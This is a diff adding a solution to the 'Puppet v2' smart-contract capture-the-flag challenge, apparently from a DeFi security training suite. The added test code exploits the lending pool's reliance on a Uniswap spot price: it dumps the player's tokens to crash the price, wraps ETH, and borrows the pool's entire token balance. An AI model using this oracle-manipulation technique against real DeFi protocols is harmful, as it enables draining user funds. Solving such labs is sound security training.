@@ -83,6 +83,19 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+         * We simply swap the initial tokens to manipulate the price.
+         * Then, we change most of our ETH into WETH using the WETH contract.
+         * Finally, we borrow all the tokens from the lending pool.
+         */
+        await token.connect(player).approve(uniswapRouter.address, ethers.constants.MaxUint256);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, 1, [token.address, weth.address], player.address, (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+        await weth.connect(player).deposit({ value: 295n * 10n ** 17n });
+        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);
+
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
